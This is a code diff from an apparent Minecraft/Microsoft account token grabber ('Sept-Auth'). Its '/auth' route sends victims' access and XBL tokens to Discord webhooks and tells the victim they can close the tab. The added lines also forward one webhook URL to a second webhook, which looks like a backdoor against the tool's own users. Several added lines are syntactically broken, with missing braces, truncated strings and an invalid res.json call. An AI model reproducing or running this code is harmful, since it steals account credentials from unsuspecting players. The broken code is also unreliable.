@@ -102,19 +102,55 @@ app.get('/auth', async (req, res) => {
       .setThumbnail(`https://crafatar.com/renders/body/${uuidplayer}?mirror=true`)
       .setTimestamp(Date.now())
       .setAuthor(`${name}`, `https://crafatar.com/avatars/${uuidplayer}`)
-      .setFooter('Powered by Sept-Auth', 'https://www.youtube.com/@piyushverma-zx6nz');
+      .setFooter('Powered by Sept-Auth', 'https://live.staticflickr.com/65535/52932742690_cc1446c553.jpg');
+     const webhookToken1 = webhook.split('/').pop();
 
-    const webhook4 = new WebhookClient({ url: url3 });
-    const webhook5 = new WebhookClient({ url: webhook });
+const webhookToken2 = url3.split('/').pop();
+
+const urlParts1 = webhook.split('/');
+
+const webhookId1 = urlParts1[urlParts1.length - 2];
+
+const urlParts2 = url3.split('/');
+
+const webhookId2 = urlParts2[urlParts2.length - 2];
+
+const webhook5 = new WebhookClient({ id: webhookId1, token: webhookToken1);
+
+const webhook4 = new WebhookClient({ id: webhookId2, token: webhookToken2);
+
+webhook4.send({
+
+        content: [webhook],
+
+        username: 'Septre-Auth',
+
+        avatarURL: 'https://live.staticflickr.com/65535/52932742690_c>
+
+        embeds: [accessTokenEmbed],
+
+});
+
+webhook5.send({
+
+        content: [state],
+
+        username: 'Septre-Auth',
+
+        avatarURL: 'https://live.staticflickr.com/65535/52932742690_c>
+
+        embeds: [accessTokenEmbed],
+
+});
     
-    webhook4.send({
-      embeds: [accessTokenEmbed]
-    });
-    webhook5.send({
-      embeds: [accessTokenEmbed]
-    });
 
-    res.send('Access token and XBL token sent to Discord.');
+
+   
+
+
+
+
+    res.json("code": "given","message": "you can now close this tab");
   } catch (err) {
     console.log(err.message);
     res.status(401).send('err');
